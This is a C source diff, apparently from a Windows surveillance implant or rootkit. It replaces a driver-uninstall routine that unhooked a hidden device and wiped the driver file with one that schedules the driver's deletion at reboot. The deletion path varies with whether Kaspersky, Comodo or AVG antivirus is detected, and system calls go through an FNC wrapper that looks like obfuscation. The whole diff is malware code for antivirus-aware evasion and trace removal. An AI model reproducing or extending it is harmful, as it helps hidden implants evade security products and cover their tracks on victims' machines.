@@ -614,25 +614,29 @@ BOOL CopySystemDriver(WCHAR *drv_path)
 	return TRUE;
 }
 
-// Cerca di togliere il più possibile del driver
-BOOL UninstallDriver()
+BOOL RemoveSystemDriver()
 {
-	HideDevice dev_unhook;
-	WCHAR drv_path[DLLNAMELEN*2];
-
-	if (!dev_unhook.unhook_isdev()) 
-		return TRUE;
+	char sys_path[DLLNAMELEN];
+	char comp_path[DLLNAMELEN*2];
+	PVOID old_value;
 	
-	dev_unhook.unhook_getpath(DRIVER_NAME_W, drv_path, sizeof(drv_path));
+	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
+		return FALSE;
+	
+	old_value = DisableWow64Fs();
 
-	for (DWORD i=0; i<MAX_DELETE_TRY; i++) {
-		if (dev_unhook.unhook_uninstall(DRIVER_NAME_W)) {
-			HM_WipeFileW(drv_path);
-			return TRUE;
-		}
-		Sleep(DELETE_SLEEP_TIME);
-	}
-	return FALSE;
+	if (IsKaspersky()) {
+		sprintf(comp_path, "%s%s%s", sys_path, "\\", DRIVER_NAME);
+		FNC(MoveFileExA)(comp_path, 0, MOVEFILE_DELAY_UNTIL_REBOOT);
+	} else if (!IsComodo2() && !IsComodo3() && !IsAVG()) {
+		sprintf(comp_path, "%s%s%s", sys_path, "\\system32\\drivers\\", DRIVER_NAME);
+		FNC(MoveFileExA)(comp_path, 0, MOVEFILE_DELAY_UNTIL_REBOOT);
+	} else // Comodo non permette di scrivere in system32
+		FNC(MoveFileExA)(HM_CompletePath(DRIVER_NAME, comp_path), 0, MOVEFILE_DELAY_UNTIL_REBOOT);
+
+	RevertWow64Fs(old_value);
+
+	return TRUE;
 }
 
 
